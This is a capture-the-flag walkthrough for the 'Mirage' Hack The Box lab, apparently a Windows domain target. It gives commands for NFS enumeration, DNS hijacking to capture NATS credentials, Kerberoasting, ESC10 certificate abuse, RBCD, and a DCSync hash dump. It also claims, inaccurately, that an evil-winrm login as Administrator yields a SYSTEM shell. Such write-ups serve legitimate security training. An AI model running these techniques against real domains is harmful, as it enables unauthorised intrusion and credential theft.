This document provides a detailed walkthrough for the Mirage HTB machine. The exploitation path involves NFS enumeration, DNS hijacking to intercept NATS credentials, Kerberoasting, and a sophisticated Active Directory certificate abuse (ESC10) to achieve full domain compromise.

---

## 1. Initial Reconnaissance

### 1.1. Port Scanning

We begin with a standard `nmap` scan to identify open ports and running services.

```bash
nmap -p- -sV -sC 10.10.11.78
```

The scan reveals typical Active Directory services (Kerberos, DNS, LDAP) and an interesting, less common service on port 4222, identified as NATS.

We discover the domain names `mirage.htb` and `dc01.mirage.htb`. Let's add them to our `/etc/hosts` file.

```bash
echo "10.10.11.78 dc01.mirage.htb mirage.htb" | sudo tee -a /etc/hosts
```

### 1.2. NFS Enumeration

We check for network file shares using `showmount`.

```bash
showmount -e 10.10.11.78
```

This reveals an open NFS share: `/MirageReports`. We mount this share to inspect its contents.

```bash
# Create a mount point and mount the share
sudo mkdir -p /mnt/mirage
sudo mount -t nfs 10.10.11.78:/MirageReports /mnt/mirage
```

Inside the share, we find two PDF files. We copy them to our local machine for analysis.

- `Incident_Report_Missing_DNS_Record_nats-svc.pdf`: This report mentions that the DNS record for `nats-svc.mirage.htb` is missing.
- `Mirage_Authentication_Hardening_Report.pdf`: This report states that NTLM authentication has been disabled, forcing a switch to Kerberos.

---

## 2. Foothold via DNS Hijacking

The missing DNS record for `nats-svc.mirage.htb` presents an opportunity for DNS hijacking. Our goal is to point this hostname to our machine to intercept traffic intended for the NATS service.

### 2.1. Kerberos Configuration

First, we configure our system to use the target's Kerberos realm. We create a `/etc/krb5.conf` file with the following content:

```ini
[libdefaults]
    default_realm = MIRAGE.HTB
    rdns = false

[realms]
    MIRAGE.HTB = {
        kdc = 10.10.11.78
        admin_server = 10.10.11.78
    }
```

### 2.2. DNS Hijacking

We create a file `dnsupdate.txt` with instructions for `nsupdate` to delete the (non-existent) record for `nats-svc.mirage.htb` and add a new one pointing to our IP address.

```
server 10.10.11.78
zone mirage.htb
update delete nats-svc.mirage.htb A
update add nats-svc.mirage.htb 60 A <YOUR_IP>
send
```

Execute the update:

```bash
nsupdate dnsupdate.txt
```

### 2.3. Intercepting Credentials

We set up a fake NATS server on our machine to listen on port 4222 and capture any credentials sent to it. The provided `listen.py` script is perfect for this.

```bash
# Start the listener
python3 listen.py
```

After a short while, a client connects and we capture the credentials for the NATS service:
- **Username:** `Dev_Account_A`
- **Password:** `hx5h7F5554fP@1337!`

---

## 3. User Flag

### 3.1. Enumerating NATS

With the captured credentials, we can now interact with the NATS service. We use the `nats` CLI tool to list available message streams.

```bash
nats stream ls --server nats://mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

This reveals a stream named `auth_logs`. We create a consumer to read from this stream.

```bash
# Create a consumer named 'reader'
nats consumer add auth_logs reader --pull --server ...

# Pull the last 5 messages
nats consumer next auth_logs reader --count=5 --server ...
```

One of the messages contains credentials for a domain user:
- **Username:** `david.jjackson`
- **Password:** `pN8kQmn6b86!1234@`

### 3.2. Kerberoasting for Lateral Movement

Using `david.jjackson`'s credentials, we run BloodHound to analyze the domain's structure and find attack paths. The analysis reveals that we can perform a **Kerberoasting** attack.

```bash
# Get a TGT for david.jjackson
impacket-getTGT mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'
export KRB5CCNAME=david.jjackson.ccache

# Find Service Principal Names (SPNs) that can be kerberoasted
impacket-GetUserSPNs -k -no-pass -dc-host dc01.mirage.htb mirage.htb/ -request
```

This gives us a crackable hash for the user `nathan.aadam`. We save the hash to a file and crack it with `john`.

```bash
john nathan_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The cracked password for `nathan.aadam` is `3edc#EDC3`.

### 3.3. Getting the User Shell

Finally, we can get a shell as `nathan.aadam`.

```bash
impacket-getTGT mirage.htb/nathan.aadam:'3edc#EDC3'
export KRB5CCNAME=nathan.aadam.ccache
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

We can now read `user.txt` from the user's desktop.

---

## 4. Privilege Escalation to Root (ESC10 Attack)

The final stage involves a certificate-based attack known as ESC10, which abuses weak certificate mappings in Active Directory Certificate Services (AD CS).

### 4.1. The Path Forward

BloodHound analysis reveals the following path:
1.  The user `mark.bbond` has the right to change the password for `javier.mmarshall`.
2.  The account `javier.mmarshall` is disabled but has the right to read the password for the Group Managed Service Account (GMSA) `Mirage-Service$`.
3.  The GMSA `Mirage-Service$` can be used to perform the ESC10 attack.

### 4.2. Executing the Attack

1.  **Enable `javier.mmarshall`:** We use credentials for `mark.bbond` (`1day@atime`, found through enumeration/context) with `bloodyAD` to enable the account, reset its password, and clear its logon hour restrictions.

2.  **Get GMSA Password:** With `javier.mmarshall`'s new password, we use `bloodyAD` again to read the `msDS-ManagedPassword` attribute for the `Mirage-Service$` account, giving us its NTLM hash.

3.  **ESC10 Certificate Abuse:** This is a multi-step process using `certipy-ad`:
    a.  **Get TGT for GMSA:** Use the GMSA hash to get a TGT for `Mirage-Service$`. 
    b.  **UPN Manipulation:** Use the GMSA TGT to update the User Principal Name (UPN) of `mark.bbond` to match the UPN of the Domain Controller (`dc01$@mirage.htb`). This links the user account to the DC.
    c.  **Certificate Enrollment:** Request a user certificate for `mark.bbond`. Because of the UPN change, AD CS issues a certificate that is valid for authenticating as the Domain Controller itself.
    d.  **Revert UPN:** Change `mark.bbond`'s UPN back to its original value.

### 4.3. Resource-Based Constrained Delegation (RBCD)

Now that we have a certificate that allows us to authenticate as the DC, we can configure RBCD.

1.  **Schannel Authentication:** Use `certipy-ad auth -pfx dc01.pfx ...` to connect to the DC over LDAPS using the new certificate.
2.  **Set RBCD:** From the LDAP shell, grant our `Mirage-Service$` account the right to impersonate users on the DC.

---

## 5. Root Flag

With RBCD configured, `Mirage-Service$` can request a service ticket to the DC for any service, impersonating any user.

1.  **Get Service Ticket:** Use `impacket-getST` to request a CIFS service ticket for the DC (`cifs/DC01.mirage.htb`), impersonating the `Administrator` user.

2.  **DCSync:** With the impersonated ticket, perform a DCSync attack using `impacket-secretsdump` to dump all domain hashes.

3.  **Administrator Shell:** Use the dumped Administrator NTLM hash or the cracked password to get a TGT and connect with `evil-winrm`.

```bash
# Get TGT for Administrator using the hash
impacket-getTGT mirage.htb/administrator -hashes <ADMIN_HASH>
export KRB5CCNAME=administrator.ccache

# Get root shell
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

We now have a shell as `NT AUTHORITY\SYSTEM` and can read `root.txt`.
